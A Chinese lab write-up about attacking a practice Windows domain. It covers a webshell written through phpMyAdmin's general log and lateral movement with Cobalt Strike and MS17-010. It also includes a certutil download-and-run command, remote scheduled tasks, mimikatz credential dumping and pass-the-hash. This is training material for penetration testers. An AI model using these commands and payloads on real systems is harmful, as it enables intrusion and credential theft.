> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/k8TqQngxkNkWeZWhrm-R7Q)<table><tbody><tr><td width="557" valign="top" height="62"><section><strong>声明：</strong>该公众号大部分文章来自作者日常学习笔记，也有少部分文章是经过原作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。</section><section>请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。</section></td></tr></tbody></table>

这篇文章由好友 @Drunkmars 投稿，写的非常详细，适合新手朋友学习，首发先知社区。

**0x01 前言**

之前在打一个域环境的时候出现了域内主机不出网的情况，当时用的是 cs 的 socks 代理将不出网主机的流量代理到了边缘主机上。当时没有考虑太多，下来之后想到搭一个环境复现一下当时的情况，看有没有更简便的方法能够打下不出网的主机。  

机缘巧合之下，发现了这个域环境还不错，再复现的过程中也有一些知识触及了我的知识盲区，也收获了许多新的知识。特地把过程记录下来，与想要学习打域内不出网主机的师傅们共同分享。

**0x02 靶场地址分配**

内网网段：192.168.52.0/24  

外网网段：192.168.10.0/24

**攻击机：**

kali：192.168.10.11

**靶场：**

win7(内)：192.168.52.143

win7(外)：192.168.10.15

**域内主机：**

Winserver2003：192.168.52.141

Winserver2008：192.168.52.138

其中 win7 可以外网、内网通信，域内主机只能内网之间进行通信  

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1Pj6eUHetShwYnPdlZlDPscmkq3icdAjYFSwic0hBog0iaDQkUrIFM6NeAMg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1PjV4oVgVBk5JyTSaY35icrYaLOlstsF8bwmzMNoFtvyb3WkzM9oN0JIcg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1PjxFfqfOELib13uB5DHmib1MdMFwj2B7bXV3PUs5nHlP2Vudawf3AkpBoQ/640?wx_fmt=png)

一开始 DCping 不通 win7，win7 关闭防火墙之后可以 ping 通

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1PjkRtP3xnrcxovstmicGic3mYdqwOzTrNGyveSnOklqbH8pzbevKvSRqnA/640?wx_fmt=png)

打开 C 盘下的 phpstudy 目录打开 web 服务

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1Pj2RJf2NxosbicgVC0uSfxfdlcqtrGfMUXicJsibMfbf626sradIUblAoow/640?wx_fmt=png)

**0x03 web 服务器渗透**

**nmap 探测端口**
-------------

```
nmap -sS -P0 -sV -O 192.168.10.15
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1PjuOibImaSFcKFRYzwAs98ZG1uCIw2dMPD1l3CeN8HU4B0InyWDcQ8qIQ/640?wx_fmt=png)  

开了 80 端口，尝试访问 web 地址，发现为 php 探针

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1PjYamRsLicghrmnyeJia4Or7EhJJq7MsZn5Yp34e85oNz5pZyBV7vThGHA/640?wx_fmt=png)

滑到最底部，发现网站底部有一个 MySQL 数据库连接检测

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1PjKuhVe0WJt2hGbA8seJFUhPdcRHOftHeujvehbI74gx8sOLwKnCKVicQ/640?wx_fmt=png)

弱口令`root/root`连接成功

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1Pj2r6rZ2vbhibwaJRlBJ5cHsj8SKrUFibmCCqPyVh7mHctYWjloR0VSlpg/640?wx_fmt=png)

**扫描后台**
--------

我这里用的是御剑，但是好像很拉，因为在我打完这个靶场之后再去网上看的时候发现他们很多扫出来一个 cms，通过 cms 也能拿 shell，这里我就不演示怎么用 cms 弱口令进后台写 shell 了，如果有感兴趣的小伙伴可以自行搜索一下

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1PjlWHqFqiauVrGTSp99DibEgLtY6IflhZwOl8a99uo3dia3uBkO7yF4cZ6A/640?wx_fmt=png)

发现`phpmyadmin`目录，还是`root/root`弱口令登陆成功

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1Pj5f1q2AiblQkibFg1VrqQSay9qnia2RrKdGfPanhGiaFlbVZeLEKQfH0J8g/640?wx_fmt=png)

进入后界面如下所示

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1Pjv2PHBUclowfgXUMRvc3nQjYtaEFv6USKuHribgmyhKbTzeFA0WMnEUA/640?wx_fmt=png)

**通过 phpmyadmin 写 shell**
-------------------------

通过 phpmyadmin 写 shell 有两种方式，首先我尝试 select into outfile 直接写入，但是他这里 secure_file_priv 的值为 NULL，所以无法提权

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1PjNSSTLy6l1r8ibodh2BV6TVyeu1sJHBayQGz6uQhSDtAb0Md2CSGHmGQ/640?wx_fmt=png)

只能使用另外一种方法，用全局日志写 shell

```
SHOW VARIABLES LIKE '%general%'
```

查看配置，可以看到全局日志是处于关闭的状态，`gengeral_log_file`返回了日志的绝对地址

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1PjsIut0H95svX9Vjwb3CPmYp9C9dRHDg5J5opJ0S6hN9QDw27CEnjGSQ/640?wx_fmt=png)

那这里我先把它的全局日志打开，再往它路径里面写入一个一句话木马

```
set global general_log = on;
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1PjR2YdXBRuSq2YjT7HrPqQwvMNOt5GMncj7xOw2CaSLtncpGrria8z5tQ/640?wx_fmt=png)

开启全局日志后修改绝对路径，注意这里有一个坑，日志给我们返回的路径是`C:\\phpStudy\\MySQL\\data\\stu1.log`，但是 mysql 访问的绝对地址为`C:\\phpStudy\\WWW`目录下的文件，所以这个地方写 shell 必须要写到 WWW 目录下才能够用蚁剑连接上

```
set global general_log_file='C:\\phpStudy\\WWW\\shell.php';
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1PjArdBTdFXbh9y5p7UMpZ43VEuFV6SmcYOV7XKRGfFnwvm1TwMQxNExQ/640?wx_fmt=png)

这里再写入一句话木马

```
select '<?php eval($_POST[cmd]);?>'
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1Pj3rjzMAZiaDxSyO31Nme6bPdNcWEVKj3gFhY7CZLBZeUoW7fOABPXu8A/640?wx_fmt=png)

然后再上蚁剑连接即可

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1Pj6xiaV5dUjeNxF2aQSaZ7Is1vR6LZFkSFWZjQc3oeibL3ZbOSwhvBMFIA/640?wx_fmt=png)

可以看到连接成功

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1Pj03xicAjZKbV55iaVAw44pXTLYh9CAC606pHHgd9e9d6V3fj23tq6lG8g/640?wx_fmt=png)

**0x04 内网信息搜集**

查看下系统的权限，一上来就是 administrator 权限就很舒服

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1Pjq3icFTxnKYCs9r5hfoVvU1tC723ssz7FpVuTqq0okovqydf1xIkPxng/640?wx_fmt=png)

`ipconfig /all`查看网络信息，域环境 + 双网卡

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1PjdVNSdIwb4yAguJicgqoVz7NurRzYYWfR2mxmbdXpBIbiaFuJG2TD9sHw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1PjuqF4iapMfXv4I4KJ1EgicRtCIr2SkwiacLibs2oZ44dc28TpVj146doictQ/640?wx_fmt=png)

`tasklist /svc`粗略看了一下，似乎是没有杀软的

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1PjBp1vRvFvFYc8SeBIKayyjPiassY6sgibT9aNYIClAQcxqJ8Zllw3C8Aw/640?wx_fmt=png)

想着没有杀软，那么直接用最简单粗暴的上 cs 更省心，上传一个 cs 生成的木马 exe 到目标主机上

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1PjyLCUmicoHdQYzdib6woWvFiaxynspQCX4QyqooADPGIrS448xhInkzrVA/640?wx_fmt=png)

用计划任务上线 cs

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1Pj2R17IvqBoUomiaRj8VCJyXAKVOh3cNvuJ4Zib88Wt9KRNkJKJeT9bpuA/640?wx_fmt=png)

成功上线

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1PjfL1MqkySNLRTwMXYBV4oFTmXPyEtlibwNE9QhKzX2ibCzG7MbTrwW12Q/640?wx_fmt=png)

**0x05 内网渗透**

**信息搜集**

`net view`查看域信息

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1PjbHuds58OUwlL4OsgK8drbOQR8PSq6iaWZyibJBV1gcIW7pw4ouOjIMDQ/640?wx_fmt=png)

使用 cs 自带的端口扫描扫一波主机

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1Pj11ziaQxeCqmnPkTmGkmHzEfRAic8WCcAJNu9lqxKrxeEkoSLshBrdDicg/640?wx_fmt=png)

扫出来所有的主机如下

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1Pjuo7CmYfoKLaaEcJcrjTsBKddIrQE6Om489n6hBDrFUL9powiaPOk66g/640?wx_fmt=png)

`hashdump`抓一波 hash

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1PjOZBxZk9agt7m0eLkibXicwY1THWZ2oibD2LM9tUOJUic7v7nwKRvOXB4ug/640?wx_fmt=png)

`logonpasswords`抓一波明文

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1PjG3hdn5h8h7HRnsrpibnqLYX7EZ9fHZv4MEPePBYnrqvTH3SRfjdAtIg/640?wx_fmt=png)

所有凭证如下，打码的原因是因为之前登陆的时候密码要重置，弄了一个带有个人信息的密码

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1PjUxSvlL3CibQwJ9hZnWAawLcVDZSaPQ9nt5XOmTuNHtGLWKdoia3FR3hA/640?wx_fmt=png)

**思路**

这里我测试了一下，因为目标主机没有开启防火墙，是能够通过 cs 自带的`psexec`一波横向抓域控和域内机器密码的，但是鉴于这个 win7 双网卡且域内另外主机不出网的情况，练习一下如何打不出网的主机

**不出网机器上线一般有以下几种方式：**

*   使用 smb beacon
    
*   配置 listener 通过 HTTP 代理上线
    
*   使用 pystinger 搭建 socks4 代理
    

这里我使用`SMB beacon`这个方法

**SMB**

Beacon 使用命名管道通过父级 Beacon 进行通讯，当两个 Beacons 链接后，子 Beacon 从父 Beacon 获取到任务并发送。因为链接的 Beacons 使用 Windows 命名管道进行通信，此流量封装在 SMB 协议中，所以 SMB beacon 相对隐蔽。SMB beacon 不能直接生成可用载荷, 只能使用 `PsExec` 或 `Stageless Payload`上线

首先得到内网中一台主机的 beacon，抓取密码后进行 smb 喷射，得到另一台开放 445 端口的机器上的 administrator 账户密码，在目标机器不出网的情况下，可以使用 Smb beacon 使目标主机上线

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1PjpWt1H2r8KGUwl4sgcLTvH4RvacCUE3spGrtE3plGwjJsJF7fsj0XJw/640?wx_fmt=png)

**1. 使用条件**

*   具有 SMB Beacon 的主机必须接受 445 端口上的连接。
    
*   只能链接由同一个 Cobalt Strike 实例管理的 Beacon。
    
*   利用这种 beacon 横移必须有目标主机的管理员权限或者说是拥有具有管理员权限的凭据。
    

**2. 使用方法**

(1) 建立 smb listener

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1PjwLMvPMBBWoHd7lYDXkykPA03or5f1eWbq394ib41b9pvCiczlFP0Iyicw/640?wx_fmt=png)

(2) 在 cs 中使用`psexec`进行横向移动，选择现有的 beacon 作为跳板，这里凭据必须是 administrator，即拥有目标主机管理员权限

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1PjUouHMSds46Au0Du0sHicLEf5EOQeyKiakSuuA3OlQOYNcicicQlzvanVkw/640?wx_fmt=png)

(3) 连接成功，可以看到`smb beacon`上线的主机右侧有∞∞标识

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1PjjJoExznlKNgb1Qib0oaaFE5QribaibEOh2ywuD5XEppyicQDmuo6pUnJdg/640?wx_fmt=png)

使用这种方法上线的机器，主要是通过出网机作为一个中间人，不出网主机成功上线后，如果出网机一断开，这个不出网主机也会断

**0x06 内网横向渗透**

**思路**

用 Ladon 扫一波内网的永恒之蓝，发现这几台主机都存在 MS17-010

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1Pj7JdDneaYFiaLoF3e8NMkIeojnrbQQWpHc0o7e4d4gUFmupdkMJG3IrQ/640?wx_fmt=png)

`ms17010`常见的几种打法：

*   msf
    
*   ladon/ladon_ms17010
    
*   从 msf 分离出的 exe
    
*   nessus 里的 exe
    
*   cs 插件
    

这几种打法，我在这个环境中都做过尝试。过程就不一一叙述了，直接说我测试的结果

msf 是最稳定的，但是打起来有稍许的麻烦因为要设置监听模块和选择攻击模块等配置。`ladon_ms17010`方便但是不太稳有时候会打不成功。cs 插件也不稳，并且在这种不出网网络不稳定的情况下成功率会变的更低

在这种不出网的情况下，可以优先考虑使用从 msf 分离出的 exe 和`ladon_ms17010`来打，打成功会直接通过自定义的 dll 新建一个用户并加入管理员组，开启 3389 端口，而且还会留一个粘滞键后门

根据实际情况，可考虑在合适的时间段和条件下直接远程登入，翻一下敏感数据，往往会因为运维人员的很多 “好习惯” 而给渗透带来很多便利，比如说“密码本. txt”

**cs 派生 msf 会话**

msf 设置监听端口

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1PjPZaLuShDaeKPJhPcDhW3uxpfrja24eHR6mlZY3h0wYNsG3nI5gsdmQ/640?wx_fmt=png)

cs 新建端口建立对话

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1PjVjheIiarqhCeecbBrUdasrqZQzH0v5GYGwyzuG1Kcbd7jx96xyNTlsQ/640?wx_fmt=png)

运行拿到 meterpreter

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1PjkvlYgeHtkhXXGVeB3qiaibyz2olcj6qgCkubllhQY6OJTxAwFITdlYZQ/640?wx_fmt=png)

**ms_17_010 获取域控权限**

这里因为知道了 DC 是有`ms_17_010`这个漏洞的，所以我先尝试了用永恒之蓝打一波，使用如下模块

```
exploit/windows/smb/ms17_010_eternalblue
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1PjFnBf76RZPia1Gntz3X5icYgP3G5psYy4KmsoEco9TctV19cME5XzaiaTQ/640?wx_fmt=png)

运行之后发现 exp 已经打过去了但是没有 session 建立

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1PjzxIggT3S9a2fVmRHbBGlNvgypxCR7VhQmfJI6gmBt0Vclr8TVxr5Hw/640?wx_fmt=png)

再换个`ms17010`的模块

```
use exploit/windows/smb/ms17_010_psexec
set payload windows/meterpreter/bind_tcp
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1PjZTeutibskVHt5DXDIicCJzl8EeibAnbDSDdTy9PGubFDibkc3A5lB6mx8g/640?wx_fmt=png)

同样没有拿到 shell，当时没有细想，后来我考虑到可能是 win7 处于两个网段的原因，所以用永恒之蓝直接打是拿不到 shell 的

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1Pj5m4aVlU4IR8eNvHiaIm0aoJ2odblRyFicryyyuugpLlr3XaDRh0e6hRg/640?wx_fmt=png)

**msf 打不出网机器的 ms_17_010**

想到之前拿到了 win7 的 meterpreter，所以用添加路由的方式尝试一下。

msf 在单兵作战的时候还是很稳定很香的。win7 在 msf 上线后，因为我们已经提前知道了，存在 52 这个不出网的段，那么就需要在 msf 中添加路由

**1. 查看路由**

```
run get_local_subnets
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1PjGO4c5MkictEHwXmULWEcHpHxiaceOO80cpatpU4JusibjZwHHmuHB2ictQ/640?wx_fmt=png)

**2. 添加路由**

```
run autoroute -s 192.168.52.0/24
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1Pj1KDDnux2jsQ27WWGc5sEjSVBkx4Ro71Xqh7P5WhZN6gb97a88z0MAQ/640?wx_fmt=png)

**3. 查看添加的路由**

```
run autoroute -p
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1PjM1njwib9BXxGLydeNczHMVk9HlSXyqDhLdCnPg0eQhushpCL0eVUznA/640?wx_fmt=png)

**4. 开始攻击**

把 shell 切换到后台，再运用 ms17_010_eternalblue 模块

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1PjD1QkOgibBxF7mz5Bpiauqke82DKl8GUnODKicJQuvr2OU8nfpiajib0aXqw/640?wx_fmt=png)

这次能够成功建立连接

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1Pjia90KO8hSqor20AD4CicdzUQmW7VXxXW8xmR9TibKhFicfuUM6cXvJzUpQ/640?wx_fmt=png)

**ms_17_010 模块总结**

**漏洞检测方法：**

设置一下目标 ip 和线程即可，这里因为已经扫出存在漏洞的机器了，所以就没有进行漏洞检测。

```
use auxiliary/scanner/smb/smb_ms17_010
```

**漏洞利用常使用的是：**

这里的第一个和第三个模块需要目标开启命名管道，并且比较稳定。第二个模块只要存在漏洞即可，但是会有概率把目标打蓝屏，而且杀软拦截也会比较严格，如果有杀软就基本可以放弃这个模块了。

```
auxiliary/admin/smb/ms17_010_command
exploit/windows/smb/ms17_010_eternalblue
exploit/windows/smb/ms17_010_psexec
```

在打 ms17010 的时候，不妨使用`auxiliary/admin/smb/ms17_010_command`模块探测一下是否可以使用命名管道。

```
use auxiliary/admin/smb/ms17_010_command
set rhosts 192.168.164.156 192.168.164.161
set command tasklist
show options
run
```

如果命令执行成功的话就可以优先考虑这两个模块进行利用

```
auxiliary/admin/smb/ms17_010_command
exploit/windows/smb/ms17_010_psexec
```

**WMI 获取域控服务器**

因为之前用了两个`ms_17_010`的模块都没有打成功，而 session 放在后台是后面才想到的打法，在当时模块没有打成功的情况下我决定另辟蹊径

首先我打开 3389 端口并关闭防火墙进到 win7 的远程桌面

**注册表开启 3389 端口**

```
REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1PjO6Pc6MIaVDr0W7UBWBOX2mCfePicq6r8DFGc3baszUdN8JUXtlKxEvA/640?wx_fmt=png)

**关闭防火墙**

```
#windows server 2003之前
netsh firewall set opmode disable 
#windows server 2003之后
netsh advfirewall set allprofiles state off
```

这个时候防火墙是开启，关闭防火墙，使用域用户`god\\administrator/hongrisec@2020`成功登录这一台 win7WEB 主机

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1PjdqRXQOGxcf6wamJSxwm2QIqGKf6qR1spFGFcW78Q4EzGEZebcOHyFQ/640?wx_fmt=png)

上传`vmiexec.vbs`到 192.168.52.143（win7）机器上，然后执行

```
cscript.exe vmiexec.vbs /cmd 192.168.52.138 administrator hongrisec@2020 "whoami"
```

因为我用 vbs 几次都没有回显，所以我这里使用的 Ladon.exe，执行

```
Ladon.exe wmiexec 192.168.52.138 administrator hongrisec@2020 whoami
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1PjUXw911fOYWGHqM602TX0h16W7w6YvCTVI6m7FJFjSoFPqA00xbhX9A/640?wx_fmt=png)

**同上面的过程一样，获取一个正向的 msf 连接，过程如下：**

首先生成一个正向的 exe 文件放到 win7 的网站目录上

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1PjvglqEvvRdSawPyibO2wf6WBhomKb5bvO1zib9vdhwwJfvfg9dST55fnA/640?wx_fmt=png)

在 win7 上看一下，上传成功

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1PjI1pWibkog1iaTBia2oZZ7azJlUDvS8SMj9rQp1xO6TCI76umBxrfAEERQ/640?wx_fmt=png)

在 win7 上使用 WMI 执行命令

```
certutil.exe -urlcache -split -f http://192.168.52.143/6666.exe&6666.exe
```

成功执行，这时候在 138 机器（即 DC-win2008）上开启 6666 端口监听

在 msf 上个运行 blin_tcp 来获取回话

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1Pjlhia5nBXahB2rseB5iaKzNzRwZeEk14icAg4icNM5pqUKWWIsf91GvLDicg/640?wx_fmt=png)

成功获取域控权限，后续提权

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1Pjr7JqU6QcQOuHXOY0CH9kva9jKbhm8xgOBupgujxBzPMHBuPMNiaBKEA/640?wx_fmt=png)

使用`CVE-2018-8120`提权，成功提到系统权限，这里我思考了一下用`MS14-068`应该也能够提权成功

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1PjWqdMEHD1HTD0pKRWJHFptpffJC4ZruCdfyhrnsSv5fLB5zHFo1KgCg/640?wx_fmt=png)

成功提权，上免杀 mimikatz，成功抓到 hash

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1PjZnibG0Fzia39J0VmMr34PSD95VI6qWDXxic0N4icDd5iaBoOYeYhkRyUzRg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1PjCTutC4sJqtiaKdzZuBGCdkSqIrib4IV9icstubJpAccn5UKiaiarj1UcEPw/640?wx_fmt=png)

**票据加计划任务获取 DC**

这里先用 msf 的命令生成正向的马 `yukong.exe`

```
windows/reverse_bind_tcp LHOST=192.168.10.11 LPORT=7777
```

把马复制到域控机器上

```
shell copy C:\\yukong.exe \\192.168.52.138\\c$
```

然后再用这个写入计划任务的方法去连接，这里马反弹会连不成功，所以使用如下命令

```
shell schtasks /create /tn "test" /tr C:\\yukong.exe /sc once /st 22:14 /S 192.168.52.138 /RU System /u administrator /p "hongrisec@2020"
```

挂着 win7 代理

```
proxy nc -vv 192.168.52.138 7777
```

即可弹回 DC 的 shell，然后清除计划任务

```
schtasks /delete /s 192.168.52.138 /tn "test" /f
```

使用 mimikatz 进行 hash 传递

```
mimikatz sekurlsa::pth /domain:god.org /user:administrator /ntlm:81be2f80d568100549beac645d6a7141
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1PjB9kXWqrFGCF9gP3g1obSbFYQooRNjunKcNNSK8PCIR7ziaV8Ufw3icrQ/640?wx_fmt=png)

查看 DC 的目录

```
shell dir \\192.168.52.138\\c$ //dir
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeyOO6yNaVnvGAJrtsEp1Pjx7S6mANWamttgf4IBPQM8NAoiaEZdd3qRRY4UG1G5u0yAo76svu3ic9g/640?wx_fmt=png)

**0x07 后记**

当然最后获取域控权限的方法还有很多，如 pth 攻击、横向哈希传递、redis 等等，而其中一些地方我用的方法也不是唯一方法，如通过扫描目录发现 cms 进入后台写 shell，用代理将 win7 流量转出来的方法，都很值得学习。  

通过这个靶场不仅锻炼了一些看过但是实战中不知道怎么使用的方法，也提升了自己独立解决问题的能力，也学到了很多新知识，如通过 phpmyadmin 写 shell 等等，用前辈说的话就是：低调求发展，潜心习安全。

关注公众号回复 “9527” 可免费获取一套 HTB 靶场文档和视频，“1120” 安全参考等安全杂志 PDF 电子版，“1208” 个人常用高效爆破字典，“0221”2020 年酒仙桥文章打包，还在等什么？赶紧点击下方名片关注学习吧！

公众号

**推 荐 阅 读**

  

  

  

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcAcRDPBsTMEQ0pGhzmYrBp7pvhtHnb0sJiaBzhHIILwpLtxYnPjqKmibA/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247487086&idx=1&sn=37fa19dd8ddad930c0d60c84e63f7892&chksm=cfa6aa7df8d1236bb49410e03a1678d69d43014893a597a6690a9a97af6eb06c93e860aa6836&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcIJDWu9lMmvjKulJ1TxiavKVzyum8jfLVjSYI21rq57uueQafg0LSTCA/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486961&idx=1&sn=d02db4cfe2bdf3027415c76d17375f50&chksm=cfa6a9e2f8d120f4c9e4d8f1a7cd50a1121253cb28cc3222595e268bd869effcbb09658221ec&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf8eyzKWPF5pVok5vsp74xolhlyLt6UPab7jQddW6ywSs7ibSeMAiae8TXWjHyej0rmzO5iaZCYicSgxg/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486327&idx=1&sn=71fc57dc96c7e3b1806993ad0a12794a&chksm=cfa6af64f8d1267259efd56edab4ad3cd43331ec53d3e029311bae1da987b2319a3cb9c0970e&scene=21#wechat_redirect)

**欢 迎 私 下 骚 扰**

  

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/XOPdGZ2MYOdSMdwH23ehXbQrbUlOvt6Y0G8fqI9wh7f3J29AHLwmxjIicpxcjiaF2icmzsFu0QYcteUg93sgeWGpA/640?wx_fmt=jpeg)